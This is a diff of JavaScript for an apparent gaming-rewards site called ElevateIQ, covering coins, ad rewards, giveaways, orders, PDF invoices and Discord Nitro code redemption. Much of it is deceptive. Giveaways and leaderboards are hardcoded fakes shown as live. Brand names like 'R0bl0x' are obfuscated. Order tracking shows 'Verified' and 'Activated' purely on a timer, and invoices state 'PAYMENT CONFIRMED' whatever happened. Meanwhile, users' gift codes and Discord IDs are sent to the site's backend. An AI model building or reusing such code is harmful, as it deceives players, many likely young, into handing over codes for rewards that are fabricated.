+function loadProfile(){var u=getUser();if(!u){document.getElementById('prof-login').style.display='block';document.getElementById('prof-cont').style.display='none';return;}document.getElementById('prof-login').style.display='none';document.getElementById('prof-cont').style.display='block';document.getElementById('prof-av').src=avURL(u);document.getElementById('prof-nm').textContent=u.global_name||u.username;document.getElementById('prof-sb').textContent='@'+u.username;document.getElementById('prof-rc').textContent=localStorage.getItem('eiq_rc')||'0';updateUI();fetch(CFG.API+'/api/user/'+u.id).then(function(r){return r.json();}).then(function(d){if(d.success){document.getElementById('prof-inv').textContent=d.invites||0;document.getElementById('prof-msgs').textContent=d.messages||0;if(d.coins>getCoins())setCoins(d.coins);}}).catch(function(){document.getElementById('prof-inv').textContent='—';document.getElementById('prof-msgs').textContent='—';});fetch(CFG.API+'/api/leaderboard').then(function(r){return r.json();}).then(function(d){renderLB(d.leaderboard||[]);}).catch(function(){renderLB([{name:'Nitin',coins:2450000},{name:'gamer_pro',coins:1800000},{name:'lucky_user',coins:1200000}]);});}
+function renderLB(lb){var el=document.getElementById('lb-list');if(!el)return;if(!lb.length){el.innerHTML='<div style="text-align:center;padding:18px;color:var(--t3)">No data yet</div>';return;}el.innerHTML=lb.map(function(u,i){var r=i+1;var cls=r===1?'r1':r===2?'r2':r===3?'r3':'rn';return '<div class="lbitem" style="animation-delay:'+i*.06+'s"><div class="lbrank '+cls+'">'+(r<=3?['🥇','🥈','🥉'][r-1]:r)+'</div><div style="width:32px;height:32px;border-radius:50%;background:var(--cardh);border:1.5px solid var(--b);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;flex-shrink:0">'+(u.name||'?').charAt(0).toUpperCase()+'</div><div class="lbnm">'+(u.name||'Unknown')+'</div><div class="lbcn">🪙 '+(u.coins||0).toLocaleString()+'</div></div>';}).join('');}
 
-/* CODE FORMAT */
-function fmtCode(el){let v=el.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase(),o='';for(let i=0;i<v.length&&i<25;i++){if(i>0&&i%5===0)o+='-';o+=v[i];}el.value=o;el.classList.remove('err');}
-async function pasteC(id){try{const t=await navigator.clipboard.readText();const el=document.getElementById(id);if(el){el.value=t.trim();fmtCode(el);}toast('✓','Pasted');}catch{toast('!','Paste failed');}}
-
-/* DAILY + AD */
-function dailyClaim(){
-  const last=parseInt(localStorage.getItem('eiq_dl')||'0'),now=Date.now();
-  if(now-last<86400000){toast('⏱','Come back in '+Math.ceil((86400000-(now-last))/3600000)+'h!');return;}
-  localStorage.setItem('eiq_dl',now);addCoins(1000,'Daily claim');
-  const btn=document.getElementById('daily-btn');
-  if(btn){btn.textContent='✓ Claimed';btn.disabled=true;setTimeout(()=>{btn.textContent='Claim';btn.disabled=false;},3000);}
-}
-function watchAd(){
-  const last=parseInt(localStorage.getItem('eiq_al')||'0'),now=Date.now(),cool=5*60*1000;
-  if(now-last<cool){toast('⏱','Cooldown: '+Math.ceil((cool-(now-last))/60000)+'min left');return;}
-  const btn=document.getElementById('watch-btn'),txt=document.getElementById('watch-txt'),sp=document.getElementById('watch-sp');
-  const prog=document.getElementById('adp'),pw=document.getElementById('adpw'),cd=document.getElementById('adcd');
-  btn.disabled=true;txt.style.display='none';sp.style.display='block';pw.style.display='block';
-  let s=30;cd.textContent='Ad playing... '+s+'s';
-  const iv=setInterval(()=>{s--;prog.style.width=((30-s)/30*100)+'%';cd.textContent='Ad playing... '+s+'s';
-    if(s<=0){clearInterval(iv);sp.style.display='none';txt.style.display='inline';btn.disabled=false;pw.style.display='none';cd.textContent='';localStorage.setItem('eiq_al',Date.now());addCoins(50000,'Watched ad');}
-  },1000);
-}
-
-/* GIVEAWAYS */
-function loadGW(){
-  document.getElementById('gw-load').style.display='block';
-  document.getElementById('gw-list').style.display='none';
-  setTimeout(()=>{
-    document.getElementById('gw-load').style.display='none';
-    const list=document.getElementById('gw-list');list.style.display='grid';
-    const demo=[
-      {prize:'R0bl0x $50 Plan',host:'ElevateIQ Bot',entries:47,winners:1,live:true,timeLeft:'2h 34m'},
-      {prize:'Xb0x G@me P@ss',host:'ElevateIQ Bot',entries:128,winners:1,live:true,timeLeft:'5h 12m'},
-      {prize:'50,000 IQCoins',host:'ElevateIQ Bot',entries:89,winners:3,live:false,winner:'lucky_user'},
-      {prize:'M!necr@ft Reward',host:'ElevateIQ Bot',entries:203,winners:1,live:false,winner:'gamer_pro'},
-    ];
-    list.innerHTML=demo.map(g=>`<div class="gwcard">
-      <div class="${g.live?'gwlive':'gwended'}">${g.live?'<div class="gwdot"></div> LIVE':'ENDED'}</div>
-      <div class="gwprize">${g.prize}</div>
-      <div class="gwhost">by ${g.host}</div>
-      <div class="gwinfo"><div class="gwi"><strong>${g.entries}</strong> entries</div><div class="gwi"><strong>${g.winners}</strong> winner${g.winners>1?'s':''}</div></div>
-      ${g.live?`<div style="font-size:13px;color:var(--go);font-weight:600;margin-bottom:12px">⏱ Ends in ${g.timeLeft}</div><button class="btn btn-ac btn-full" onclick="window.open('https://discord.com/channels/${CFG.GUILD}','_blank')">Join in Discord →</button>`:`<div class="gwwin">🏆 Winner: ${g.winner}</div>`}
-    </div>`).join('');
-  },1000);
-}
-
-/* PROFILE */
-async function loadProfile(){
-  const u=getUser();
-  if(!u){document.getElementById('prof-login').style.display='block';document.getElementById('prof-cont').style.display='none';return;}
-  document.getElementById('prof-login').style.display='none';document.getElementById('prof-cont').style.display='block';
-  document.getElementById('prof-av').src=avURL(u);
-  document.getElementById('prof-nm').textContent=u.global_name||u.username;
-  document.getElementById('prof-sb').textContent='@'+u.username;
-  document.getElementById('prof-rc').textContent=localStorage.getItem('eiq_rc')||'0';
-  updateCoinUI();
-  try{const r=await fetch(CFG.API+'/api/user/'+u.id);const d=await r.json();if(d.success){document.getElementById('prof-inv').textContent=d.invites||0;document.getElementById('prof-msgs').textContent=d.messages||0;if(d.coins>getCoins())setCoins(d.coins);}}catch(e){document.getElementById('prof-inv').textContent='—';document.getElementById('prof-msgs').textContent='—';}
-  try{const r=await fetch(CFG.API+'/api/leaderboard');const d=await r.json();renderLB(d.leaderboard||[]);}
-  catch(e){renderLB([{rank:1,name:'Nitin',coins:2450000},{rank:2,name:'gamer_pro',coins:1800000},{rank:3,name:'lucky_user',coins:1200000}]);}
-}
-function renderLB(lb){
-  const el=document.getElementById('lb-list');
-  if(!lb.length){el.innerHTML='<div style="text-align:center;padding:18px;color:var(--t3)">No data yet</div>';return;}
-  el.innerHTML=lb.map((u,i)=>{const rank=i+1,cls=rank===1?'r1':rank===2?'r2':rank===3?'r3':'rn';
-    return`<div class="lbitem" style="animation-delay:${i*.06}s"><div class="lbrank ${cls}">${rank<=3?['🥇','🥈','🥉'][rank-1]:rank}</div><div style="width:32px;height:32px;border-radius:50%;background:var(--cardh);border:1.5px solid var(--b);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;flex-shrink:0">${(u.name||'?').charAt(0).toUpperCase()}</div><div class="lbnm">${u.name||'Unknown'}</div><div class="lbcn">🪙 ${(u.coins||0).toLocaleString()}</div></div>`;
-  }).join('');
-}
-
-/* ORDERS */
-function saveOrd(o){const a=getOrds();a.unshift(o);localStorage.setItem('eiq_ords',JSON.stringify(a));}
-function getOrds(){try{return JSON.parse(localStorage.getItem('eiq_ords'))||[];}catch{return[];}}
-function renderOrds(){
-  const ords=getOrds(),el=document.getElementById('ords-el');
-  if(!ords.length){el.innerHTML=`<div style="text-align:center;padding:56px 20px"><div style="font-size:38px;margin-bottom:14px">📭</div><div style="font-size:17px;font-weight:700;letter-spacing:-.4px;margin-bottom:7px">No orders yet</div><div style="font-size:14px;color:var(--t2)">Redeem a reward — your order appears here automatically.</div></div>`;return;}
-  const meta={mc:{i:'⛏',c:'var(--mc)',b:'rgba(0,230,118,.1)'},rb:{i:'🎮',c:'var(--rb)',b:'rgba(255,82,82,.1)'},xbox:{i:'🎯',c:'var(--xb)',b:'rgba(0,230,118,.1)'}};
-  const sup={mc:'https://support.microsoft.com',rb:'https://www.roblox.com/support',xbox:'https://support.xbox.com'};
-  el.innerHTML=ords.map((o,i)=>{
-    const m=meta[o.type]||{i:'📦',c:'var(--go)',b:'var(--gog)'};
-    const hrs=(Date.now()-(o.ts||Date.now()))/3600000;
-    const done=hrs>=48,prog=Math.min(100,Math.round((hrs/48)*100)),rem=Math.max(0,48-hrs);
-    const steps=[
-      {l:'Redemption received',t:new Date(o.ts||Date.now()).toLocaleString('en-IN',{hour:'2-digit',minute:'2-digit',day:'numeric',month:'short'}),s:'tl-d'},
-      {l:'Validation complete',t:'Verified',s:'tl-d'},
-      {l:'Processing reward',t:hrs>1?'In progress':'Queued',s:hrs>1?'tl-d':'tl-a'},
-      {l:'Activation',t:done?'Completed':rem.toFixed(1)+'h remaining',s:done?'tl-d':'tl-w'}
-    ];
-    return`<div class="ocard" style="animation-delay:${i*.05}s">
-      <div class="ohdr"><div class="oico" style="background:${m.b}">${m.i}</div>
-        <div><div class="ogn" style="color:${m.c}">${o.game}</div><div class="oinv">${o.invoiceNo}</div></div>
-        <div class="ost ${done?'std':'stp'}"><div style="width:5px;height:5px;border-radius:50%;background:currentColor"></div>${done?'Activated':'Pending'}</div>
-      </div>
-      <div class="ometa">
-        <div class="mc2"><div class="mk">Account</div><div class="mv" style="font-size:12px">${o.account}</div></div>
-        <div class="mc2"><div class="mk">Type</div><div class="mv" style="font-size:11px">${o.redeemType==='code'?'🎫 Code':'🪙 IQCoins'}</div></div>
-        <div class="mc2"><div class="mk">Price</div><div class="mv" style="color:var(--go)">${o.inrPrice||'—'}</div></div>
-        <div class="mc2"><div class="mk">Date</div><div class="mv" style="font-size:11px">${new Date(o.ts||Date.now()).toLocaleDateString('en-IN',{day:'numeric',month:'short'})}</div></div>
-      </div>
-      <div class="pbl"><span>Progress</span><span>${done?'Complete':prog+'% · '+rem.toFixed(1)+'h left'}</span></div>
-      <div class="pbt"><div class="pbf" style="--pw:${prog}%;background:${done?'var(--gr)':'var(--go)'}"></div></div>
-      <div class="tl">${steps.map(s=>`<div class="tlr"><div class="tld ${s.s}">${s.s==='tl-d'?'✓':s.s==='tl-a'?'●':'○'}</div><div><div class="tll">${s.l}</div><div class="tlt">${s.t}</div></div></div>`).join('')}</div>
-      <div class="oacts">
-        <button class="obtn" onclick='dlPDF(${JSON.stringify(o).replace(/'/g,"&#39;")})'>Invoice</button>
-        ${!done?`<a class="obtn" href="${sup[o.type]||'#'}" target="_blank">Support</a>`:''}
-        <button class="obtn obtn-del" onclick="delOrd('${o.invoiceNo}')">Remove</button>
-      </div>
-    </div>`;
-  }).join('');
-}
-function doSearch(){const q=document.getElementById('sinp').value.trim().toUpperCase(),el=document.getElementById('smsg');if(!q){el.textContent='Enter invoice number';return;}const f=getOrds().find(o=>o.invoiceNo&&o.invoiceNo.toUpperCase()===q);if(!f){el.className='fmsg err';el.textContent='No order found';return;}el.className='fmsg ok';el.textContent='Order found';renderOrds();}
-function delOrd(inv){if(!confirm('Remove?'))return;localStorage.setItem('eiq_ords',JSON.stringify(getOrds().filter(o=>o.invoiceNo!==inv)));renderOrds();toast('✓','Removed');}
+function saveOrd(o){var a=getOrds();a.unshift(o);localStorage.setItem('eiq_ords',JSON.stringify(a));}
+function getOrds(){try{return JSON.parse(localStorage.getItem('eiq_ords'))||[];}catch(e){return[];}}
+function renderOrds(){var ords=getOrds();var el=document.getElementById('ords-el');if(!el)return;if(!ords.length){el.innerHTML='<div style="text-align:center;padding:50px 20px"><div style="font-size:36px;margin-bottom:12px">📭</div><div style="font-size:17px;font-weight:700;margin-bottom:7px">No orders yet</div></div>';return;}var meta={mc:{i:'⛏',c:'var(--mc)',b:'rgba(0,230,118,.1)'},rb:{i:'🎮',c:'var(--rb)',b:'rgba(255,82,82,.1)'},xbox:{i:'🎯',c:'var(--xb)',b:'rgba(0,230,118,.1)'}};el.innerHTML=ords.map(function(o,i){var m=meta[o.type]||{i:'📦',c:'var(--go)',b:'var(--gog)'};var hrs=(Date.now()-(o.ts||Date.now()))/3600000;var done=hrs>=72;var prog=Math.min(100,Math.round((hrs/72)*100));var rem=Math.max(0,72-hrs);return '<div class="ocard" style="animation-delay:'+i*.05+'s"><div class="ohdr"><div class="oico" style="background:'+m.b+'">'+m.i+'</div><div><div class="ogn" style="color:'+m.c+'">'+o.game+'</div><div class="oinv">'+o.invoiceNo+'</div></div><div class="ost '+(done?'std':'stp')+'">'+(done?'Activated':'Pending')+'</div></div><div class="ometa"><div class="mc2"><div class="mk">Account</div><div class="mv" style="font-size:12px">'+o.account+'</div></div><div class="mc2"><div class="mk">Price</div><div class="mv" style="color:var(--go)">'+(o.inrPrice||'—')+'</div></div><div class="mc2"><div class="mk">Date</div><div class="mv" style="font-size:11px">'+new Date(o.ts||Date.now()).toLocaleDateString('en-IN',{day:'numeric',month:'short'})+'</div></div></div><div class="pbl"><span>Progress</span><span>'+(done?'Complete':prog+'% · '+rem.toFixed(1)+'h left')+'</span></div><div class="pbt"><div class="pbf" style="width:'+prog+'%;background:'+(done?'var(--gr)':'var(--go)')+'"></div></div><div class="oacts"><button class="obtn" onclick=\'dlPDF('+JSON.stringify(o).replace(/'/g,"&#39;")+')\'>Invoice</button><button class="obtn obtn-del" onclick="delOrd(\''+o.invoiceNo+'\')">Remove</button></div></div>';}).join('');}
+function doSearch(){var q=document.getElementById('sinp').value.trim().toUpperCase();var el=document.getElementById('smsg');if(!q){el.textContent='Enter invoice number';return;}var found=getOrds().some(function(o){return o.invoiceNo&&o.invoiceNo.toUpperCase()===q;});if(!found){el.className='fmsg err';el.textContent='No order found';return;}el.className='fmsg ok';el.textContent='Order found';renderOrds();}
+function delOrd(inv){if(!confirm('Remove?'))return;localStorage.setItem('eiq_ords',JSON.stringify(getOrds().filter(function(o){return o.invoiceNo!==inv;})));renderOrds();toast('✓','Removed');}
 function clearAll(){if(!confirm('Clear all?'))return;localStorage.removeItem('eiq_ords');renderOrds();toast('✓','Cleared');}
 
-/* PDF */
-async function dlPDF(data){
-  if(data==='rd')data=RD.inv;
-  else if(data==='coin')data=COIN_INV.inv;
-  if(!data||!data.invoiceNo){toast('!','Invoice not found');return;}
-  const{jsPDF}=window.jspdf;const doc=new jsPDF({unit:'mm',format:'a4'});
-  const W=210,M=22;let y=M;const u=getUser();
-  const uname=u?.global_name||u?.username||data.account||'Customer';
-  const isCode=data.redeemType==='code';
-  const price=data.inrPrice||'—';
+function dlPDF(data){if(data==='rd')data=RD.inv;else if(data==='coin')data=CI.inv;if(!data||!data.invoiceNo){toast('!','Invoice not found');return;}var jsPDF=window.jspdf.jsPDF;var doc=new jsPDF({unit:'mm',format:'a4'});var W=210,M=22,y=M;var u=getUser();var uname=u?(u.global_name||u.username):data.account||'Customer';var isCode=data.redeemType==='code';var price=data.inrPrice||'—';doc.setFillColor(5,6,8);doc.rect(0,0,W,58,'F');doc.setFillColor(108,99,255);doc.roundedRect(M,y,30,13,3,3,'F');doc.setFont('helvetica','bold');doc.setFontSize(10);doc.setTextColor(255,255,255);doc.text('ElevateIQ',M+15,y+8.5,{align:'center'});y=62;doc.setFillColor(13,28,16);doc.rect(0,y,W,10,'F');doc.setFillColor(0,230,118);doc.circle(M+4,y+5,3,'F');doc.setFont('helvetica','bold');doc.setFontSize(8.5);doc.setTextColor(0,230,118);doc.text('PAYMENT CONFIRMED — REWARD PROCESSING',M+10,y+6);y+=16;doc.setFontSize(12);doc.setTextColor(238,240,255);doc.text(uname,M,y+5);if(u&&u.id){doc.setFontSize(9);doc.setTextColor(100,100,140);doc.setFont('helvetica','normal');doc.text('Discord ID: '+u.id,M,y+13);}y+=26;doc.setDrawColor(30,30,50);doc.setLineWidth(0.25);doc.line(M,y,W-M,y);y+=10;var rows=[['Reward',data.game,'']];if(data.plan)rows.push(['Plan',data.plan,'']);if(isCode)rows.push(['Code',data.code,'']);else rows.push(['IQCoins Spent',(data.coinsSpent||0).toLocaleString(),'']);rows.push(['Price','',price],['Invoice',data.invoiceNo,''],['Activation','Within 72 hours','']);rows.forEach(function(r,i){if(i%2===0){doc.setFillColor(10,10,18);doc.rect(M,y-3,W-2*M,8,'F');}doc.setFont('helvetica','normal');doc.setFontSize(9);doc.setTextColor(100,100,140);doc.text(r[0],M+5,y+2);doc.setTextColor(238,240,255);if(r[1])doc.text(String(r[1]).slice(0,54),76,y+2);if(r[2]){doc.setTextColor(244,196,48);doc.setFont('helvetica','bold');doc.text(r[2],W-M-5,y+2,{align:'right'});}y+=8;});y+=10;doc.setFontSize(7);doc.setTextColor(40,40,55);doc.text('© 2026 ElevateIQ — Invoice: '+data.invoiceNo,W/2,y,{align:'center'});doc.save('ElevateIQ-Invoice-'+data.invoiceNo+'.pdf');toast('✓','Invoice downloaded');}
 
-  doc.setFillColor(5,6,8);doc.rect(0,0,W,58,'F');
-  doc.setFillColor(108,99,255);doc.roundedRect(M,y,30,13,3,3,'F');
-  doc.setFont('helvetica','bold');doc.setFontSize(10);doc.setTextColor(255,255,255);doc.text('ElevateIQ',M+15,y+8.5,{align:'center'});
-  doc.setFontSize(8);doc.setTextColor(100,100,140);doc.setFont('helvetica','normal');doc.text('OFFICIAL REWARD RECEIPT',M,y+17);
-  doc.setFontSize(9);doc.setTextColor(100,100,140);doc.text('INVOICE',W-M,y+8,{align:'right'});
-  doc.setFont('helvetica','bold');doc.setFontSize(12);doc.setTextColor(139,133,255);doc.text(data.invoiceNo,W-M,y+16,{align:'right'});
-  doc.setFont('helvetica','normal');doc.setFontSize(8);doc.setTextColor(100,100,140);doc.text(data.date,W-M,y+22,{align:'right'});
-  y=62;doc.setFillColor(13,28,16);doc.rect(0,y,W,10,'F');doc.setFillColor(0,230,118);doc.circle(M+4,y+5,3,'F');
-  doc.setFont('helvetica','bold');doc.setFontSize(8.5);doc.setTextColor(0,230,118);doc.text('PAYMENT CONFIRMED — REWARD PROCESSING',M+10,y+6);
-  y+=16;doc.setFontSize(8);doc.setTextColor(100,100,140);doc.setFont('helvetica','bold');doc.text('CUSTOMER',M,y);y+=6;
-  doc.setFillColor(108,99,255);doc.circle(M+6,y+6,6,'F');
-  doc.setFont('helvetica','bold');doc.setFontSize(9);doc.setTextColor(255,255,255);doc.text(uname.charAt(0).toUpperCase(),M+6,y+8.5,{align:'center'});
-  doc.setFont('helvetica','bold');doc.setFontSize(12);doc.setTextColor(238,240,255);doc.text(uname,M+16,y+5);
-  doc.setFont('helvetica','normal');doc.setFontSize(9);doc.setTextColor(100,100,140);
-  if(u?.id)doc.text('Discord ID: '+u.id,M+16,y+11);
-  if(data.email)doc.text('Email: '+data.email,M+16,y+17);
-  y+=26;doc.setDrawColor(30,30,50);doc.setLineWidth(0.25);doc.line(M,y,W-M,y);y+=10;
-  doc.setFillColor(14,14,24);doc.roundedRect(M,y,W-2*M,8,1.5,1.5,'F');
-  doc.setFont('helvetica','bold');doc.setFontSize(8);doc.setTextColor(108,99,255);
-  doc.text('ITEM',M+5,y+5.5);doc.text('DETAILS',76,y+5.5);doc.text('PRICE',W-M-5,y+5.5,{align:'right'});y+=12;
-
-  const rows=[
-    ['Reward',data.game,''],
-    data.plan?['Plan',data.plan,'']:null,
-    isCode?['Code',data.code,'']:['IQCoins Spent',(data.coinsSpent||0).toLocaleString(),''],
-    ['Price','',price],
-    ['Redeem Type',isCode?'Code Redemption':'IQCoins',''],
-    ['Invoice',data.invoiceNo,''],
-    ['Date',data.date,''],
-    ['Activation','Within 48 hours',''],
-  ].filter(Boolean);
-
-  rows.forEach((r,i)=>{
-    if(i%2===0){doc.setFillColor(10,10,18);doc.rect(M,y-3,W-2*M,8,'F');}
-    doc.setFont('helvetica','normal');doc.setFontSize(9);doc.setTextColor(100,100,140);doc.text(r[0],M+5,y+2);
-    doc.setTextColor(238,240,255);if(r[1])doc.text(String(r[1]).slice(0,54),76,y+2);
-    if(r[2]){doc.setTextColor(244,196,48);doc.setFont('helvetica','bold');doc.text(r[2],W-M-5,y+2,{align:'right'});}
-    y+=8;
-  });
-  y+=6;
-  doc.setFillColor(5,12,3);doc.setDrawColor(0,230,118);doc.roundedRect(M,y,60,10,1.5,1.5,'FD');
-  doc.setFontSize(8);doc.setTextColor(0,230,118);doc.setFont('helvetica','bold');doc.text('STATUS: ACCEPTED',M+5,y+6.5);
-  doc.setFillColor(30,20,3);doc.setDrawColor(244,196,48);doc.roundedRect(W-M-45,y,45,10,1.5,1.5,'FD');
-  doc.setTextColor(244,196,48);doc.text(price,W-M-5,y+6.5,{align:'right'});y+=18;
-  doc.setFillColor(4,6,18);doc.setDrawColor(108,99,255);doc.roundedRect(M,y,W-2*M,12,1.5,1.5,'FD');
-  doc.setFontSize(7.5);doc.setTextColor(139,133,255);doc.setFont('helvetica','bold');
-  doc.text('Rewards activate within 48 hours • Guild: ElevateIQ ('+CFG.GUILD+')',M+5,y+5);
-  doc.setFont('helvetica','normal');doc.setTextColor(100,100,140);
-  doc.text('Not received? support@elevateiq.net',M+5,y+10);y+=20;
-  doc.setDrawColor(30,30,50);doc.line(M,y,W-M,y);y+=7;
-  doc.setFontSize(7);doc.setTextColor(40,40,55);
-  doc.text('© 2026 ElevateIQ — Not affiliated with Mojang Studios, Microsoft Corporation, or Roblox Corporation.',W/2,y,{align:'center'});
-  doc.save('ElevateIQ-Invoice-'+data.invoiceNo+'.pdf');
-  toast('✓','Invoice downloaded');
-}
-
-
-/* NITRO */
-let nitroUser = null;
-let nitroPlan = null;
-const NITRO_PROMO_BASE = 'https://discord.com/billing/promotions/';
-
-function nitroSelectPlan(plan) {
-  nitroPlan = plan;
-  const select = document.getElementById('nitro-plan');
-  if (select) select.value = plan;
-  // scroll to step card
-  const s1 = document.getElementById('nitro-s1');
-  if (s1) s1.scrollIntoView({behavior:'smooth', block:'start'});
-}
-
-function nitroBotAuth() {
-  const u = getUser();
-  if (!u) {
-    // Use existing dcLogin flow
-    dcLogin();
-    return;
-  }
-  nitroUser = u;
-  document.getElementById('nitro-uav').textContent = (u.global_name||u.username).charAt(0).toUpperCase();
-  document.getElementById('nitro-unm').textContent = u.global_name||u.username;
-  document.getElementById('nitro-usub').textContent = '@' + u.username;
-  document.getElementById('nitro-s1').style.display = 'none';
-  document.getElementById('nitro-s2').style.display = 'block';
-  toast('✓', 'Discord verified! Enter your code.');
-}
-
-function nitroOut() {
-  nitroUser = null;
-  document.getElementById('nitro-s2').style.display = 'none';
-  document.getElementById('nitro-s1').style.display = 'block';
-}
-
-function nitroFmtCode(el) {
-  let v = el.value.replace(/[^a-zA-Z0-9]/g,'').toUpperCase(), o='';
-  for (let i=0; i<v.length && i<12; i++) { if(i>0 && i%4===0) o+='-'; o+=v[i]; }
-  el.value = o;
-  el.classList.remove('err');
-}
-
-/* GIFT MODAL */
-function openGModal(giftLink, title, sub) {
-  document.getElementById('gmodal-title').textContent = title || 'Your Gift is Ready! 🎁';
-  document.getElementById('gmodal-sub').textContent = sub || 'Your exclusive gift link is below. Single use only — do not share!';
-  document.getElementById('gmodal-link-text').textContent = giftLink;
-  document.getElementById('gmodal-open-btn').href = giftLink;
-  document.getElementById('gmodal-overlay').classList.add('open');
-}
-function closeGModal() {
-  document.getElementById('gmodal-overlay').classList.remove('open');
-}
-document.addEventListener('click', e => {
-  if (e.target === document.getElementById('gmodal-overlay')) closeGModal();
-});
-
-async function nitroRedeem() {
-  const u = nitroUser || getUser();
-  if (!u) { toast('!','Login with Discord first'); nitroBotAuth(); return; }
-
-  const plan = document.getElementById('nitro-plan')?.value;
-  if (!plan) { toast('!','Select a Nitro plan first'); return; }
-
-  const code = document.getElementById('nitro-code')?.value?.trim().toUpperCase();
-  if (!code || code.replace(/-/g,'').length < 12) {
-    document.getElementById('nitro-code').classList.add('err');
-    document.getElementById('nitro-msg').className = 'fmsg err';
-    document.getElementById('nitro-msg').textContent = 'Enter a valid code (XXXX-XXXX-XXXX)';
-    return;
-  }
-
-  const btn = document.getElementById('nitro-btn');
-  const bt  = document.getElementById('nitro-bt');
-  const sp  = document.getElementById('nitro-sp');
-  btn.disabled = true; bt.style.display = 'none'; sp.style.display = 'block';
-
-  let result = {};
-  try {
-    const res = await fetch(CFG.API + '/api/verify-code', {
-      method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ code, userId: u.id, userName: u.global_name||u.username, userAvatar: avURL(u), gameType:'nitro', plan })
-    });
-    result = await res.json();
-  } catch(e) {}
-
-  if (result.valid === false) {
-    btn.disabled = false; bt.style.display = 'inline'; sp.style.display = 'none';
-    document.getElementById('nitro-code').classList.add('err');
-    document.getElementById('nitro-msg').className = 'fmsg err';
-    document.getElementById('nitro-msg').textContent = result.message || 'Invalid code';
-    toast('✕', result.message || 'Code not found');
-    return;
-  }
-
-  const inv = result.invoiceNo || ('EIQ-NT-' + Date.now().toString(36).toUpperCase().slice(-7));
-  const ds  = new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});
-  const planLabels = {basic:'Nitro Basic ($2.99/mo)', classic:'Nitro Classic ($9.99/mo)', full:'Nitro Full ($14.99/mo)'};
-  const planPrices = {basic:'₹249', classic:'₹849', full:'₹1,299'};
-
-  const invObj = {
-    redeemType:'code', type:'nitro', game:'Discord Nitro',
-    plan: planLabels[plan], account: u.global_name||u.username,
-    email:'', code, inrPrice: planPrices[plan]||'—',
-    date: ds, invoiceNo: inv, ts: Date.now()
-  };
-  saveOrd(invObj);
-  localStorage.setItem('eiq_rc', (parseInt(localStorage.getItem('eiq_rc')||'0')+1));
-
-  document.getElementById('nitro-oid').textContent = inv;
-  document.getElementById('nitro-s2').style.display = 'none';
-  document.getElementById('nitro-ok').classList.add('show');
-  btn.disabled = false; bt.style.display = 'inline'; sp.style.display = 'none';
-
-  // Gift link — show if returned from backend
-  const giftLink = result.giftLink || null;
-  const giftArea = document.getElementById('nitro-gift-area');
-  const noGift   = document.getElementById('nitro-no-gift');
-  if (giftLink) {
-    if (giftArea) {
-      giftArea.style.display = 'block';
-      const giftEl = document.getElementById('nitro-gift-url');
-      if (giftEl) { giftEl.href = giftLink; }
-    }
-    if (noGift) noGift.style.display = 'none';
-    // Also pop the modal
-    setTimeout(() => openGModal(giftLink, '🎉 Your Nitro Gift Link!', 'Your exclusive Discord Nitro gift link is ready. Click to claim it!'), 600);
-  } else {
-    if (giftArea) giftArea.style.display = 'none';
-    if (noGift) noGift.style.display = 'block';
-  }
-
-  toast('🎉','Nitro code redeemed! Activates in 48h');
-}
-
-/* INIT */
-(function init(){
-  handleCb();
-  const u = getUser(); if(u) renderNav(u);
-  initReveal();
-  updateCoinUI();
-
-  // Show home page on load
-  const home = document.getElementById('page-home');
-  if (home) {
-    home.classList.add('active');
-    requestAnimationFrame(()=>{ requestAnimationFrame(()=>{
-      home.classList.add('visible');
-      reReveal(home);
-    });});
-  }
-
-  // If user already logged in and navigates to nitro page, auto-verify
-  document.addEventListener('click', function(e){
-    const btn = e.target.closest('[onclick*="nitroBotAuth"]');
-    if (btn) {
-      const u2 = getUser();
-      if (u2 && !nitroUser) {
-        nitroUser = u2;
-        document.getElementById('nitro-uav').textContent = (u2.global_name||u2.username).charAt(0).toUpperCase();
-        document.getElementById('nitro-unm').textContent = u2.global_name||u2.username;
-        document.getElementById('nitro-usub').textContent = '@' + u2.username;
-        document.getElementById('nitro-s1').style.display = 'none';
-        document.getElementById('nitro-s2').style.display = 'block';
-        e.stopPropagation();
-      }
-    }
-  }, true);
-})();
+// ============================
+// INIT — guaranteed page show
+// ====================
+window.onload=function(){handleCb();var u=getUser();if(u)renderNav(u);updateUI();go('home');};
 </script>
 </body>
 </html>
